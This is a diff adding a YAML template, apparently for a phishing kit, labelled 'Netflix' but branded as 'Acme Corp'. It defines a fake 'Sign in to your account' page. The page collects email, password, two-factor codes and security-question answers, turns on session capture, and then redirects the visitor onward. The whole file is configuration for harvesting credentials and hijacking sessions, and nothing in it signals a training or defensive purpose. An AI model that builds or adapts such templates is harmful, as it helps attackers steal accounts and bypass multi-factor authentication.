@@ -1,0 +1,45 @@
+name: "Netflix"
+author: "Sheikh-CoedexTech"
+version: "1.0"
+
+page_title: "Sign in to your account"
+company_name: "Acme Corp"
+logo_url: ""
+favicon_url: ""
+redirect_after: "https://example.com/dashboard"
+
+fields:
+  - id: email
+    name: email
+    label: Email Address
+    type: email
+    placeholder: "you@company.com"
+    required: true
+  - id: password
+    name: password
+    label: Password
+    type: password
+    placeholder: "Enter your password"
+    required: true
+  - id: mfa
+    name: otp_code
+    label: Two-Factor Code
+    type: text
+    placeholder: "Enter 2FA code"
+    required: false
+  - id: security_question
+    name: security_answer
+    label: Security Question Answer
+    type: text
+    placeholder: "Answer"
+    required: false
+
+session_capture: true
+session_capture_method: direct
+
+branding:
+  primary_color: "#1a73e8"
+  secondary_color: "#1765cc"
+  background_color: "#f0f2f5"
+  company_logo: "/custom/logo.png"
+  custom_css: "/custom/style.css"
